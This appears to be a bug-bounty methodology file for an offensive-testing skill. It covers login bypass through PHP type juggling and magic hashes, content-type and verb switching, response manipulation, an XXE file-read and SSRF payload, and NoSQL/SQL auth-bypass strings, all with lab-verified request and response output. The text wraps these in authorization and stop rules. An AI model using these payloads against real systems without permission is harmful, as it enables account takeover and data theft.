# Login Bypass — defeating the credential check itself

## Contents
- Fingerprint the stack first (don't spend PHP time on a Go backend)
- A — PHP type juggling and magic hashes
- B — Content-type / format switching
- C — Verb switching on the auth endpoint
- D — Response manipulation (mostly self-exploitation — the one case that isn't)
- E — Injection on the credential check (recognition only)
- Converts? — the honest verdict table
- Ladder discipline

Every other file in this skill starts *after* a credential exists — a JWT to
forge, an OAuth code to replay, an MFA challenge to skip, a reset token to steal.
This one covers the step before all of them: **the comparison that decides
whether the submitted password was right**. The finding is an authenticated
session (or a minted token) reached without the credential, proven on a
protected server route — not a `200` on `/login`.

Every payload and every observed output below was executed against local labs on
this host (`php -S`, `python3 http.server`) with **PHP 8.3.6 / Python 3.12.3 /
Node 20.19.5 / qs 6.13.0**. Where PHP 8 killed a technique, that is stated as a
dead technique, not softened.

---

## Fingerprint the stack first (don't spend PHP time on a Go backend)

Section A only applies to PHP. Three probes settle it, one request each, and none
needs a banner.

**Probe 1 — parameter-name mangling.** PHP rewrites `.`, space and `[` inside
parameter *names* to `_`, and no other mainstream stack does. Send the mangled
name and see which key the app echoes, errors on, or reflects:

```bash
curl -s "$H/login?user.name=A"      # PHP -> the app sees user_name
curl -s "$H/login?user%20name=B"    # PHP -> the app sees user_name
```

Observed against `php -S` echoing `$_GET`:

```
user.name=A     -> {"GET":{"user_name":"A"},"POST":[]}
user%20name=B   -> {"GET":{"user_name":"B"},"POST":[]}
user%5bname=C   -> {"GET":{"user_name":"C"},"POST":[]}
```

**Probe 2 — duplicate-parameter precedence**, parser-agnostic. One query string,
`?password=1&password=2`, three stacks, three answers, all measured here:

| stack | observed | precedence |
|---|---|---|
| PHP 8.3.6 `$_GET` | `{"GET":{"password":"2"},"POST":[]}` | last wins |
| Python 3.12 `parse_qs(...)[0]` | `{"seen":"1","type":"str"}` | first wins |
| Node `querystring.parse` | `{"password":["1","2"]}` | array |
| Node `URLSearchParams.get()` | `"1"` (`.getAll()` → `["1","2"]`) | first wins |
| `qs` 6.13.0 (Express default) | `{"password":["1","2"]}` | array |

**Probe 3 — PHP-8-specific.** Send `password[]=x` at a string sink and watch for
a **500 with a `TypeError`** (§A3). That confirms both PHP and the 8.x family.

Confirmatory but not required: `X-Powered-By: PHP/8.3.6`, a `PHPSESSID` cookie,
a `.php` path. Absence of those proves nothing — probe 1 does.

---

## A — PHP type juggling and magic hashes

### A0 — What PHP 8 changed, and what survives

PHP 8.0 landed the RFC *"Saner string to number comparisons"*
(`https://wiki.php.net/rfc/string_to_number_comparison`). A number compared to a
**non-numeric** string no longer casts the string to a number; the number is cast
to string and they compare as strings. Measured on this host's 8.3.6:

```
0 == "admin"        => false        # PHP 7: true. DEAD.
0 == ""             => false        # PHP 7: true. DEAD.
"abc" == 0          => false        # DEAD
"1abc" == 1         => false        # DEAD
"" == null          => true         # still live
null == false       => true         # still live
"1" == "01"         => true         # still live (both numeric strings)
"10" == "1e1"       => true         # still live
100 == "1e2"        => true         # still live
" 1" == 1           => true         # leading whitespace still numeric
"1 " == 1           => true         # trailing whitespace numeric since 8.0
0 == "0e12345"      => true         # still live -> magic hashes survive
```

So: the "send `0` and match any string" family is **dead**. Two families are
untouched, and both are still worth an attempt.

### A1 — Magic hashes (`0e[0-9]+`), still live in PHP 8

When two **numeric strings** are compared with `==`, PHP compares them
numerically regardless of version. A hex digest that happens to be `0e` followed
by 62/30 digits is a valid float literal — `0e...` is zero — so **every**
`0e`-digit digest equals every other one, and equals `"0"` and `0`.

Two candidates recovered by brute-forcing the integer keyspace on this host
(new, not copied from a list — the search and both hits are reproducible below):

```
md5("903251147")  = 0e174510503823932942361353209384
md5("314282422")  = 0e990995504821699494520356953734
```

Plus the classics, recomputed here to confirm they are still `0e`-form:

```
md5("240610708")  = 0e462097431906509019562988736854
md5("QNKCDZO")    = 0e830400451993494058024219903391
md5("aabg7XSs")   = 0e087386482136013740957780965295
md5("aabC9RqS")   = 0e041022518165728065344349536299
sha1("10932435112") = 0e07766915004133176347055865026311692244
sha1("aaroZmOk")    = 0e66507019969427134894567494305185566735
```

Comparison results, `php` 8.3.6:

```
md5("903251147") == md5("314282422")   => true
md5("903251147") == md5("QNKCDZO")     => true
md5("903251147") == "0"                => true
md5("903251147") === md5("314282422")  => false      # === is the fix
sha1("10932435112") == sha1("aaroZmOk") => true
sha1("10932435112") == 0                => true
```

The bug shape is `if (md5($_POST['password']) == $row['password_hash'])`. If the
**stored** hash is `0e`-form, any of the strings above logs in.

Over the wire, against a lab whose stored hash is `md5("240610708")`:

```
903251147    -> {"computed":"0e174510503823932942361353209384","authenticated":true}
314282422    -> {"computed":"0e990995504821699494520356953734","authenticated":true}
QNKCDZO      -> {"computed":"0e830400451993494058024219903391","authenticated":true}
aabC9RqS     -> {"computed":"0e041022518165728065344349536299","authenticated":true}
hunter2      -> {"computed":"2ab96390c7dbe3439de74d0c9b0b1767","authenticated":false}
```

**Oracle**: the same account, same endpoint — one of the six strings returns the
success state (session cookie / token / `authenticated:true`) while `hunter2`
returns the failure state. Anything less (a different error string, a timing
delta) is not this bug.

**Cost note, so you budget honestly.** A `0e`-form md5 needs `0`, then `e`, then
30 digits: `(1/16)² × (10/16)³⁰` ≈ 2.9×10⁻⁹, i.e. **~1 in 3.4×10⁸**. A
shipped generator does **~2.9M digests/sec/core** on this host (5,000,000 in
1.74s), so the full `0..2.4×10⁹` space is ~15 core-minutes — about 2 minutes on 8
workers — and yields **~8 md5 hits**: `240610708`, `314282422`, `571579406`,
`903251147`, `1110242208` and the classics. Do not
burn engagement time on this — carry the six known strings, and only search
offline if you want more. The generator, exactly as run:

```php
<?php   // php magic2.php <start> <count>   -- scan an integer range for 0e[0-9]+ digests
$start = (int)$argv[1]; $count = (int)$argv[2];
for ($i=$start; $i<$start+$count; $i++) {
  $h = md5((string)$i);
  if ($h[0]==='0' && $h[1]==='e' && ctype_digit(substr($h,2))) echo "MD5 $i $h\n";
  $h = sha1((string)$i);
  if ($h[0]==='0' && $h[1]==='e' && ctype_digit(substr($h,2))) echo "SHA1 $i $h\n";
}
```
```bash
for k in $(seq 0 7); do php magic2.php $((k*300000000)) 300000000 >> hits.txt & done
# observed after ~3 min:
#   MD5 903251147 0e174510503823932942361353209384
#   MD5 314282422 0e990995504821699494520356953734
```

sha1 is ~1 in 1.5×10¹⁰ (38 digits needed) — the two known strings are worth more
than a search. `0e`-form **sha256** is out of reach at ~1 in 1.2×10¹⁵. If the app
hashes with sha256, bcrypt or `password_hash()`, drop this angle entirely.

### A2 — `json_decode` type confusion: `{"password":true}` (the live one)

This is the type-juggling technique most likely to still work in 2026, because
PHP 8 did **not** change bool comparison: when either operand is a bool, the
*other* operand is cast to bool. Every non-empty, non-`"0"` string is `true`.

```
true == "s3cr3t_hash_value"  => true      # the bypass
true == "0"                  => false     # stored value "0" defeats it
true == ""                   => false
true === "s3cr3t"            => false     # === is the fix
0    == "s3cr3t"             => false     # PHP 7: true. DEAD in PHP 8.
```

A password hash is never `""` or `"0"`, so `true` beats a loose compare against
a stored hash or a stored plaintext every time. Measured over HTTP against
`if ($json['password'] == $stored)`:

```
{"password":"s3cr3t"}  -> {"sent_type":"string","authenticated":true}    # baseline
{"password":"wrong"}   -> {"sent_type":"string","authenticated":false}   # negative control
{"password":true}      -> {"sent_type":"boolean","authenticated":true}   # BYPASS
{"password":0}         -> {"sent_type":"integer","authenticated":false}  # dead on PHP 8
{"password":null}      -> {"sent_type":"NULL","authenticated":false}
{"password":[]}        -> {"sent_type":"array","authenticated":false}
```

Send `true` at **every** credential-shaped JSON field, not just `password`:
`token`, `otp`, `code`, `signature`, `hash`, `secret`, `api_key`, `state`,
`nonce`. `switch()` uses loose comparison too — `switch(true) { case "admin": }`
matched in the lab, `switch(0) { case "admin": }` did not.

`in_array()` without the strict flag has the identical hole, and it is common in
static API-key allowlists:

```
in_array(true,  ["admin","user"])        => true      # BYPASS
in_array(true,  ["admin","user"], true)  => false     # strict flag is the fix
in_array(0,     ["admin","user"])        => false     # PHP 7: true. DEAD.
in_array("1e2", [100])                   => true      # numeric-string family
in_array("0e12",["0e34"])                => true      # magic-hash family
array_search(true, ["a","b"])            => 0         # returns index 0, which is falsy
```

Over HTTP against `in_array($json['token'], ['tok_alpha','tok_bravo'])`:

```
{"token":"tok_alpha"} -> {"sent_type":"string","accepted":true}    # baseline
{"token":"nope"}      -> {"sent_type":"string","accepted":false}   # negative control
{"token":true}        -> {"sent_type":"boolean","accepted":true}   # BYPASS
{"token":0}           -> {"sent_type":"integer","accepted":false}
{"token":1}           -> {"sent_type":"integer","accepted":false}
```

**Oracle**: identical request, the value swapped from a wrong string to `true`,
and the failure state becomes the success state — a `Set-Cookie`, a token in the
body, or a protected route that now returns data. Confirm on the protected
route, not on the login response.

Note `array_search(true, [...]) => 0`: an authorship/index check written as
`if (!array_search($t, $valid))` treats a *successful* match at index 0 as a
failure. That is a bug, not a bypass — do not report it as one.

### A3 — `strcmp()` / array injection (`password[]=`) — a PHP-8 fingerprint, not a bypass

The PHP 5/7 classic was `strcmp($_POST['password'], $real) == 0` with
`password[]=x`: `strcmp` warned, returned `NULL`, and `NULL == 0` was `true`.
PHP 8.0's RFC *"Consistent type errors for internal functions"*
(`https://wiki.php.net/rfc/consistent_type_errors`) turned every one of those
warnings into a `TypeError`. Measured on 8.3.6:

```
strcmp([], "x")                 => TypeError: strcmp(): Argument #1 ($string1) must be of type string, array given
strcmp("x", [])                 => TypeError: strcmp(): Argument #2 ($string2) must be of type string, array given
strcasecmp([], "x")             => TypeError: strcasecmp(): Argument #1 ($string1) must be of type string, array given
md5([])                         => TypeError: md5(): Argument #1 ($string) must be of type string, array given
hash("sha256", [])              => TypeError: hash(): Argument #2 ($data) must be of type string, array given
password_verify([], $h)         => TypeError: password_verify(): Argument #1 ($password) must be of type string, array given
hash_equals($stored, [])        => TypeError: hash_equals(): Argument #2 ($user_string) must be of type string, array given
hash_equals($stored, true)      => TypeError: hash_equals(): Argument #2 ($user_string) must be of type string, true given
```

So on PHP 8 the array **crashes** the comparison instead of neutralising it:

```
password=s3cr3t   -> HTTP 200  {"authenticated":true}
password=wrong    -> HTTP 200  {"authenticated":false}
password[]=x      -> HTTP 500  {"error":"TypeError","msg":"strcmp(): Argument #1 ($string1) must be of type string, array given"}
```

**Oracle**: a `500` where a `401` belongs. Two useful facts, one non-finding:

- it confirms PHP 8.x and tells you the credential reaches an untyped internal
  function — keep going on A2;
- if the 500 body leaks the file path and the failing function, you have the
  auth code's shape for free;
- **it is not a login bypass and does not convert on its own.** A stack trace on
  a login endpoint reports as a verbose-error informative and gets closed.

Raw `==` with an array is also dead as a bypass, PHP 8:

```
[] == "s3cr3t"    => false        ["x"] == "s3cr3t"  => false
[] == 0           => false        [] == false        => true     (not useful for auth)
```

Two remaining PHP-8-live oddities worth one request each:

- **`null` still coerces.** `strcmp(null, "")` returns `0` (with a deprecation
  notice, not an error), and `md5(null)` equals `md5("")` =
  `d41d8cd98f00b204e9800998ecf8427e`. So *omitting* the field entirely is a
  different test from sending `""` — send both.
- **`$` matches before a trailing newline** unless the pattern carries `/D`. An
  allowlist `preg_match('/^[a-z]+$/', $user)` accepts `"admin\n"` (returns `1`);
  with `/D` it returns `0`. Under `/m` the anchors go per-line and
  `"admin\n' OR 1=1--"` passes a `/^[a-z]+$/m` allowlist outright. Useful when
  the validated value is later concatenated into a header, a query, or a mail
  envelope — the newline is the payload carrier. A trailing null byte does
  **not** get you there: `preg_match('/^[a-z]+$/', "admin\0x")` returned `0` and
  `"admin\0" == "admin"` is `false`.

**Ladder**: A1/A2 are **rung 2** — you authenticate into an account. Prove it on
a seed/admin account or on an account you own. If the bypass drops you into a
*real* user's session on prod, capture the login proof and stop; browsing their
data is rung 3/5 (`../../_shared/references/safe-ladder.md`).

---

## B — Content-type / format switching

The same logical login parsed as JSON, form-urlencoded, XML or multipart often
runs a **different code path** with different validation. A guard that reads the
framework's form-parsed bag (`$_POST`, `request.form`, `req.body` after
`urlencoded()`) sees nothing when the body arrives as JSON — while the handler
that actually authenticates reads the raw body.

Lab: guard rejects non-alphanumeric passwords by reading `$_POST['password']`;
handler authenticates from `body_params()`, which reads `php://input` for JSON.
Same credential, six encodings:

```
form-urlencoded, correct pw      {"guard_saw":"s3cr3t","guard_blocked":false,"handler_saw":"s3cr3t","authenticated":true}
form-urlencoded, QNKCDZO!!       {"guard_saw":"QNKCDZO!!","guard_blocked":true,"handler_saw":"QNKCDZO!!","authenticated":false}
application/json                 {"guard_saw":null,"guard_blocked":false,"handler_saw":"QNKCDZO","authenticated":true}
application/json;charset=utf-8   {"guard_saw":null,"guard_blocked":false,"handler_saw":"QNKCDZO","authenticated":true}
APPLICATION/JSON                 {"guard_saw":null,"guard_blocked":false,"handler_saw":"QNKCDZO","authenticated":true}
multipart/form-data              {"guard_saw":"QNKCDZO","guard_blocked":false,"handler_saw":"QNKCDZO","authenticated":true}
text/plain (json body)           {"guard_saw":null,"guard_blocked":false,"handler_saw":null,"authenticated":false}
```

Rows 3-5 are the finding shape: `guard_saw` went to `null` — the validator never
ran — while `handler_saw` still carried the credential and the account
authenticated, purely because `Content-Type` changed. Row 2 is the negative
control: the identical value under the canonical encoding is blocked. Row 7 is
the useful null result — `text/plain` reaches no parser at all, so nothing
authenticates; that is not a bypass, it is a dead branch.

### The ladder, one request each

Rotate these against the login endpoint, keeping the credential identical:

```
application/x-www-form-urlencoded          (baseline)
application/json                           {"user":"…","password":"…"}
application/json; charset=utf-8            (parameter tolerance)
APPLICATION/JSON                           (case tolerance)
application/json;boundary=--x              (bogus extra parameter)
application/xml   /  text/xml              <login><password>…</password></login>
multipart/form-data
text/plain                                 (does any parser run at all?)
<Content-Type header removed entirely>
```

Measured tolerances on the python3 lab — all five of these reached the JSON
branch and authenticated: `application/json`, `application/json; charset=utf-8`,
`APPLICATION/JSON`, `application/json ;x=1`, `application/json;boundary=--x`.
A guard that string-matches `=== 'application/json'` is defeated by any of the
last four.

**Removing the header entirely — the honest negative result.** On PHP 8 with no
`Content-Type`, `$_POST` is **empty**: `$_POST` is populated only for a recognised
form content type, so stripping the header blinds the handler, not the guard.

> **Do not measure this on `php -S`.** Its dev server leaks parser state between
> requests: a no-header request inherits the *previous* request's content type, so
> a header-less probe fired after a urlencoded one shows a populated `$_POST` and
> looks like a bypass. Verified: fresh server -> `post_count=0`; after one
> urlencoded request -> `2`; after a `text/plain` request -> `0` again. That is a
> dev-server artifact and does not reproduce on a real SAPI. Use a real fpm/apache
> target, or read the body twice from two encodings, before believing any
> Content-Type result.
So stripping the header does **not** skip a Content-Type-keyed WAF rule. What does
work is the split in §C2: the guard reads `$_POST` while the handler reads
`php://input`, so a body the guard cannot see is still parsed downstream.

### Array vs scalar per encoding — this is what unlocks E

Only some encodings can express a non-string. Measured:

| body | Python `parse_qs` | PHP `parse_str` | Node `qs` 6.13.0 |
|---|---|---|---|
| `password[]=x` | `{'password[]': ['x']}` — no `password` key at all | `{"password":["x"]}` | `{"password":["x"]}` |
| `password[$ne]=x` | `{'password[$ne]': ['x']}` — brackets are literal | `{"password":{"$ne":"x"}}` | `{"password":{"$ne":"x"}}` |
| `password=x&password=y` | `{'password': ['x','y']}`, apps read `[0]` → `"x"` | `"y"` (last) | `["x","y"]` |

Python stdlib never builds a nested object from brackets — so a Flask/Django
login cannot be reached with `password[$ne]=`; use the JSON body there. PHP and
`qs` both do, which is why the same operator has two delivery routes on those
stacks.

JSON expresses every type in every stack:

```
{"password":true}          -> type bool
{"password":0}             -> type int
{"password":null}          -> type NoneType
{"password":[]}            -> type list
{"password":{"$ne":null}}  -> type dict          <- the NoSQLi shape, section E
{"password":"x","password":"s3cr3t"} -> "s3cr3t" <- duplicate JSON keys: last wins
```

The practical consequence: **if the JSON endpoint rejects operator objects, try
the same operator through form-urlencoded brackets** on an Express/PHP stack —
`qs` 6.13.0 turns `user[$ne]=x&password[$ne]=x` into
`{"user":{"$ne":"x"},"password":{"$ne":"x"}}`, which is the section-E payload
arriving by a route the JSON validator never sees.

### Switching to XML opens XXE

If the login accepts XML at all, the parser behind it is a new attack surface,
not just a new encoding. Confirmed on the python3 lab with `xml.sax` and
`feature_external_ges` enabled — an external entity in the `<password>` element
was resolved and **echoed back in the login response**:

```bash
curl -s -H 'Content-Type: application/xml' --data-binary @- "$H/login" <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE l [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<l><password>&xxe;</password></l>
EOF
```
```
{"branch": "application/xml", "type": "str", "seen": "hacking\n", "guard_passed": true, "authenticated": false, "parse_error": null}
```

`seen` is the host's `/etc/hostname`, echoed back through the login response.
Swap the entity for an HTTP URL and the same element becomes an SSRF sink on an
**unauthenticated** endpoint:

```bash
<!DOCTYPE l [<!ENTITY oob SYSTEM "http://127.0.0.1:8096/x.txt">]>
```
```
{"branch": "application/xml", "type": "str", "seen": "OOB-HIT\n", "guard_passed": false, "authenticated": false, "parse_error": null}
listener: 127.0.0.1 - - [26/Jul/2026 14:28:55] "GET /x.txt HTTP/1.1" 200 -
```

On a real target the reflection is usually absent — use your interactsh listener
as the oracle instead of a reflected file read.

XXE and its escalation are **not owned here** — take the sink to
`../../ssrf-safe/references/cve-tooling.md` (XML/SVG external entities → SSRF)
and, when the XML is a SAML assertion, to `saml-xsw.md` §F.

**Oracle for B**: the same logical request, only the encoding changed, and either
(a) the auth outcome flips, or (b) a validator that fired on one encoding is
silent on another (`guard_saw: null` above), or (c) a type reaches the comparison
that the canonical encoding could not express. A merely *different error message*
per content-type is rung 0 and closes as informative.

**Ladder**: rung 1–2. All of this is your own credential against your own
account.

---

## C — Verb switching on the auth endpoint

The general 403-bypass ladder — the path dimension, the method dimension, and
the `X-HTTP-Method-Override` / `_method` per-stack matrix — is owned by
`../../broken-access-control/references/role-matrix.md` §1b. Run that file
against any *gated route*, including a gated admin login. This section covers
only what is specific to the **auth endpoint**, where the question is not "can I
reach the handler" but "which branch validated my password".

### C1 — Only one verb validates

Lab: the handler validates the password when `REQUEST_METHOD === 'POST'` and
falls through to a username-only branch otherwise. Same body, six verbs:

```
POST    -> {"endpoint":"login-verb","method":"POST","password_validated":true,"authenticated":false}
GET     -> {"endpoint":"login-verb","method":"GET","password_validated":false,"authenticated":true}
PUT     -> {"endpoint":"login-verb","method":"PUT","password_validated":false,"authenticated":true}
PATCH   -> {"endpoint":"login-verb","method":"PATCH","password_validated":false,"authenticated":true}
DELETE  -> {"endpoint":"login-verb","method":"DELETE","password_validated":false,"authenticated":true}
```

`password=wrong` in every one of those. Only `POST` set
`password_validated:true`, and only `POST` refused the login. Real shapes this maps
onto: a framework route registered `any()`/`match()` instead of `post()`; a
hand-rolled `if ($_SERVER['REQUEST_METHOD'] == 'POST') { validate(); }`; an
`@RequestMapping` with no `method =`; a rate-limit or CAPTCHA middleware bound to
`POST` only.

### C2 — The form bag is empty on a non-POST verb

PHP populates `$_POST` only for `POST`. A guard that reads `$_POST` therefore
sees *nothing* on `PUT`/`PATCH`, while a handler reading `php://input` still gets
the credential. Measured — same lab as B, verb changed to `PUT`:

```
POST + urlencoded    -> {"guard_saw":"s3cr3t","handler_saw":"s3cr3t","authenticated":true}
PUT  + urlencoded    -> {"guard_saw":null,"handler_saw":"s3cr3t","authenticated":true}
PUT  + multipart     -> {"guard_saw":null,"handler_saw":null,"authenticated":false}
```

Row 2 is B and C composed: the guard went blind (`guard_saw:null`) purely because
the verb changed, *and* the credential still reached the comparison. Row 3 shows
it is verb×encoding, not verb alone — PHP parses neither bag for `PUT`+multipart,
so the credential is lost too. Try the cross product on any endpoint where B
showed a guard/handler split.

### C3 — `HEAD` suppresses the body, not the side effect

`HEAD` is routed to the `GET` handler by most stacks, so state changes still
happen while the response body — often the only thing a rate-limiter, a WAF or a
logger inspects — is gone. Measured, on a lab that sets a session cookie on the
success path:

```bash
curl -s -D- -o/dev/null "$H/login-head?user=admin"  | grep -Ei '^HTTP/|^Set-Cookie'   # GET
curl -s -I              "$H/login-head?user=admin"  | grep -Ei '^HTTP/|^Set-Cookie'   # HEAD
curl -s -I              "$H/login-head?user=nobody" | grep -Ei '^HTTP/|^Set-Cookie'   # HEAD, denied
```
```
HTTP/1.1 200 OK
Set-Cookie: SESSID=sess_3042d7230c56; path=/
HTTP/1.1 200 OK
Set-Cookie: SESSID=sess_3042d7230c56; path=/
HTTP/1.1 401 Unauthorized
```

The cookie is issued on `HEAD` with no body at all. Two consequences:

- **the status/header pair is still a clean oracle** (`200`+`Set-Cookie` vs
  `401`) even when the body is suppressed;
- **a body-only check is skipped** — if validation lives in a response filter
  that inspects the body, `HEAD` walks past it.

**Oracle for C**: identical credential and body, one verb changed, and the
failure state becomes the success state — a `Set-Cookie`, a token, or a
protected route that now returns data. `GET /login` returning the login *form*
is not a bypass; `405 Method Not Allowed` is the control working. Diff the
**bodies**, not the status codes — a `200` serving the SPA shell is noise. On
`HEAD`, where there is no body, the status + `Set-Cookie` pair is the oracle.

**Ladder**: rung 1–2, your own credential.

---

## D — Response manipulation (mostly self-exploitation — the one case that isn't)

**Say this first, plainly: intercepting `{"success":false}` and flipping it to
`true` in your own browser proves nothing and closes as informative.** You
changed a value on your own machine and your own machine believed you. It is the
same shape as `../../validation/references/auto-discard.md` row 4 (`self-xss`,
"self-only impact = no impact") and row 13 (`no-poc`). Do not build a report
around a Burp/Caido match-and-replace screenshot.

It becomes a real finding in exactly three cases, and each has a distinct oracle:

**D1 — The server already sent the data.** The response says "denied" *and*
carries the protected fields. Nothing was flipped; the data was in the body the
whole time, and the client merely declined to render it. This is a server-side
data leak and reports as one — the response manipulation is just how you noticed.

Mechanised oracle — enumerate every leaf field in the **denied** response and
compare it against the correctly-gated sibling:

```bash
curl -s "$H/api/profile" | jq -c '[paths(type!="object" and type!="array")|join(".")]'
```

Observed, the leaking route then the fixed one:

```
/api/profile        ["authorized","message","profile.email","profile.ssn_last4","profile.salary"]
/api/profile-fixed  ["authorized","message"]
```

```
profile        200 123B
profile-fixed  403  49B
```

The first is the bug: it answered `200` carrying `profile.*` while claiming
`authorized:false`; the correctly-built sibling answers `403` with two fields and
half the bytes. Report the leaked field names and one redacted sample row —
never the flipped screenshot.

Do **not** use `jq 'paths(scalars)'` here: `paths(f)` keeps a path only when
`f` yields a *truthy* value, so it silently drops exactly the `false`/`null`
leaves you are hunting — `authorized` disappears from the output. Verified:
`paths(scalars)` returned `["message","profile.email","profile.ssn_last4","profile.salary"]`
for the same body. Use the `type!=` form above.

**D2 — The client mints or unlocks a credential from that value.** The flag does
not gate rendering, it gates a *call*: `if (res.authenticated) { token =
await mintSession() }`, or an offline/kiosk build where the session cookie is
written client-side. The proof is not the flipped response — it is the token you
now hold, exercised against a **protected server route** in a clean session.

**D3 — A later request is authorized on the strength of it.** The client
forwards the flag (`?verified=true`, `X-Auth-Ok: 1`, a step token) and the
server trusts it on the next hop. Then the finding is the *server* trusting a
client-supplied assertion — reproduce it with `curl` alone, no proxy, no client.

**The oracle that separates real from self-exploitation, in one line**: replay
the flow from a **clean session with `curl` only, never touching the response**,
and hit a canonical protected route. If that route returns data, it is D1/D2/D3.
If it still returns `401`, you flipped a pixel — rotate the angle.

This is the same rule `mfa-session.md` §A applies to MFA response manipulation;
that file owns the MFA-specific variant.

**Ladder**: rung 1 — you are reading a response the server already sent you.

---

## E — Injection on the credential check (recognition only)

`../../sqli` owns the method for both families. This section is only about
recognising them **at the login**, where the boolean oracle is unusually clean:
the differential is *logged in vs not*, so you never need error strings or
timing.

- **NoSQLi** — the login takes a JSON body and a value can be swapped for an
  operator object: `{"user":"admin","password":{"$ne":null}}`, or
  `{"user":{"$gt":""},"password":{"$gt":""}}` to land on the first (often seed
  admin) record. The form-urlencoded equivalent is
  `user[$ne]=x&password[$ne]=x` — confirmed above that `qs` 6.13.0 and PHP
  `parse_str` both build the operator object from it, so B is how you deliver E
  when the JSON validator rejects objects. Method, `$regex` extraction and
  `$where` oracles: `../../sqli/references/nosql-injection.md` §1–§3.
- **SQLi** — `' OR 1=1-- ` in the username *inside a JSON login body* is the
  variant people miss, because parameter-level scanners only see the form
  version. Try it in `username`, in `password`, and in any `tenant`/`domain`/
  `realm` field the login also takes. Method, fingerprint and blind extraction:
  `../../sqli/references/detection-fingerprint.md`, then
  `../../sqli/references/blind-extraction.md`.

**Oracle for both**: authenticated vs not, on a protected route — not an error
message. A `500` from a malformed operator is a fingerprint, not a bypass.

**Ladder**: rung 2 — proving you authenticated *without the password* is the
finding. If it lands you in a real user's account on prod, prove entry and stop
(`../../sqli/references/nosql-injection.md` "Non-destructive").

---

## Converts? — the honest verdict table

| Technique | Converts? | What gets it closed |
|---|---|---|
| A1 magic hash → session on an account you don't own | **Critical** (ATO) / **High** if it only reaches a seed account | Rare in 2026: needs loose `==` on md5/sha1 *and* a `0e`-form stored hash. Showing the string set without a login is rung 0. |
| A2 `{"password":true}` / `in_array(true,…)` → session | **Critical** if it authenticates any account; **High** if it only passes a static API-key allowlist | Must land a session or token on a protected route. `sent_type:boolean` in a debug echo is not the proof. |
| A2 `{"password":0}` | **Dead on PHP 8.** Do not report. | Worked on PHP ≤7.4 only. |
| A3 `password[]=` → `500 TypeError` | **Informative. Does not convert.** | `auto-discard` row 8 (`verbose-error`): a stack trace with no sensitive data leak. Use it as a fingerprint and move to A2. |
| B content-type switch that flips the auth outcome or blinds a validator | **High**, graded by what the bypassed control was (WAF, rate limit, CAPTCHA, complexity check) | A different *error message* per content-type is informative. You need the outcome to change. |
| B XML branch → XXE file read / OOB | **High–Critical**, but it is an SSRF/XXE finding | Report it via `ssrf-safe`, not as an auth bug. Frame it as "the login endpoint parses attacker XML unauthenticated". |
| C verb switch → session without password validation | **Critical** if it authenticates; **Medium** if it only skips a rate limit or CAPTCHA | `GET /login` serving the form, or a `405`, is the control working. |
| C `HEAD` side effect without body inspection | **Low–Medium** on its own; **High** when it defeats a named control (rate limit, WAF body rule, audit log) | Needs the bypassed control named and its enforcement shown on the `POST`/`GET` sibling. |
| D1 protected fields already in the denied body | **High–Critical** by data class | Report as a data-exposure bug with the field list; never as "I flipped a boolean". |
| D2/D3 client-minted credential / server trusts a client flag | **High–Critical** | Only with a clean-session `curl` reproduction. Any PoC that requires a proxy interceptor reads as self-exploitation. |
| D — flipping a flag in your own browser | **Never. Informative.** | Self-exploitation, same bucket as self-XSS. Do not surface it. |
| E NoSQLi / SQLi auth bypass | **Critical** | Owned by `../../sqli` — hand it over rather than writing it up here. |

**Framing that avoids the "informative" close**, across all of A–D: lead with the
*authenticated read*, not the mechanism. "A `Content-Type: application/json` body
skips the complexity guard and the account authenticates; `GET /api/me` with the
resulting cookie returns the account record" converts. "The login endpoint is
vulnerable to PHP type juggling" does not.

---

## Ladder discipline

- Everything in this file is **rung 1–2** by construction: your own credential,
  your own account, read-only confirmation on a protected route.
- **Never brute-force credentials.** These are logic bypasses — six known magic
  strings, one `true`, one content-type, one verb. If an angle needs volume, it
  is the wrong angle. `ffuf-web-fuzzing` explicitly forbids credential
  brute-force too.
- If a bypass lands you in a **real** user's or an admin's session on prod:
  capture the login proof (status, `Set-Cookie`, one non-PII `/me` field), then
  **stop**. Browsing their data is rung 3/5 — not attempted: ask d0x directly before executing
  (`../../_shared/references/safe-ladder.md`).
- Change no state. Do not reset the account's password, do not disable its MFA,
  do not use the session for anything past the one read that proves you are in.
- Flag every account you authenticated into for rotation in the lead file under
  `targets/<program>/leads/`
  (`../../_shared/references/output-contract.md`).
